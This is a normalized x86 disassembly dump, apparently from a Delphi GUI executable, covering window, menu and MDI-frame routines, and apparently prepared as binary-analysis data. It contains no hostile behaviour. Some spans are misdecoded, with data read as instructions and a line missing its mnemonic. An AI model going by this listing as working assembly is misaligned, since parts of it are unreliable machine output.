mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43c800
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_458400
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41ce94
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_458928
test eax eax
je r-xdata
push ebp
call sub_458400
pop ecx
push ebp
call sub_458400
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_45844c
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_45566c
jmp r-xdata
sub_45866c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_45683c
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_4586d8
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_456ed8
mov eax ebx
call sub_4449fc
test al al
je r-xdata
mov eax ebx
call sub_4199a4
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_4446f8
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_44151c
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_4446f8
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_419978
call sub_4521ac
mov edx esi
mov eax ebx
call sub_419978
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
sub_458770
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_4587ed
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_4587f8
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_441c98
sub_458824
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_441c98
xor edx edx
jmp r-xdata
mov eax esi
call sub_4569b8
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_45885c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_43d6c8
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_441c98
sub_4588a0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_43d7d4
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_4588f4
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_43ad50
sub_458928
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_45c498
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_45c484
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_458974
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_45c498
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45c484
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_4589c4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_41386c
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_4589f4
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_4446f8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_45c468
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_45c468
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_4589c4
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_45c468
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45c454
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_4139c8
call sub_40326c
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45c454
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45c454
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45c454
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_458af8
push ebx
mov ebx eax
mov eax ebx
call sub_458af0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_422f50
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_458b20
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_441c50
mov dl 0x1
mov eax esi
call sub_458e84
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_458f00
mov edx eax
mov eax esi
call sub_43e064
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_441dec
mov dl 0x1
mov eax esi
call sub_457ea4
sub_458b43
add [ eax ] al
test [ esi + 0x1c ] 0x10
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_441c50
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_458f00
mov edx eax
mov eax esi
call sub_43e064
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_441dec
pop esi
pop ebx
retn
mov dl 0x1
mov eax esi
call sub_457ea4
sub_458ba0
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_4446f8
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_44e7a8
mov edi eax
mov eax ebp
call sub_4446f8
push eax
call DrawMenuBar
sub_458c1c
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_419450
xor edx edx
mov eax ebx
call sub_450140
sub_458c40
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_458ba0
mov eax edx
mov edx ebx
call sub_419450
sub_458c68
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_458e2e
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_45c498
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_451cf4
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45c484
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_419450
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45c484
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b450
call sub_4039f8
mov eax ebx
call sub_4449fc
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_4446f8
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_458ba0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458e35
lea eax [ ebp - 0x10 ]
call sub_403fbc
retn
mov dl 0x1
mov eax ebx
call sub_459d2c
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_4449fc
test al al
je r-xdata
mov eax ebx
call sub_4449fc
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_4446f8
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_4446f8
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_4446f8
mov edx eax
mov eax esi
call sub_451cf4
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_4446f8
push eax
call SetMenu
sub_458e50
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_458e3c
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_458eac
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_458ea0
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_458f18
push ebx
mov ebx eax
mov eax ebx
call sub_443d10
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_458f00
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_458f00
mov edx eax
mov eax ebx
call sub_43e064
mov edx 0xff00000f
mov eax ebx
call sub_43e064
pop ebx
retn
sub_458f9c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_4446f8
push eax
call ShowWindow
sub_458fdc
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4589f4
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_4589f4
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_45c468
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45c454
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_4589f4
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45c454
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_45c468
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_45c454
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_45c454
call sub_45c158
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45c454
call sub_45c13c
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45c454
call sub_45c124
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_45c454
call sub_45c124
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45c454
call sub_45c124
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45c454
call sub_45c170
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_45c454
call sub_45c158
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45c454
call sub_45c13c
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_45c454
call sub_45c124
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45c454
call sub_45c170
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_45c454
call sub_45c158
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_45c454
call sub_45c158
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_45c454
call sub_45c158
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45c454
call sub_45c13c
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45c454
call sub_45c124
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45c454
call sub_45c170
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_45c454
call sub_45c124
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45c454
call sub_45c170
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_45c454
call sub_45c158
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45c454
call sub_45c13c
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_459330
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_4567ec
mov edx esi
mov eax edi
call sub_45bcd4
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_4593df ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_44151c
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_44151c
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax DefMDIChildProcA
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_459541
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4567fc
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
mov eax ebx
call sub_459ea0
push eax
push 0x1
push 0x80
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_43d8c8
push eax
mov eax ebx
call sub_43d90c
push eax
mov eax ebx
call sub_4446f8
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_4069c4
mov [ ebx + 0x254 ] eax
push ebx
push sub_45848c
call sub_41a410
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_44e7a8
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_4446f8
push eax
call SetWindowPos
jmp r-xdata
sub_45968e
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_4597b9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_441880
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_45bbac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4597c0
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_4597c8
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_441aec
push 0x0
mov eax ebx
call sub_4446f8
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_45980c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_442270
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_4446f8
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_4446f8
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_459870
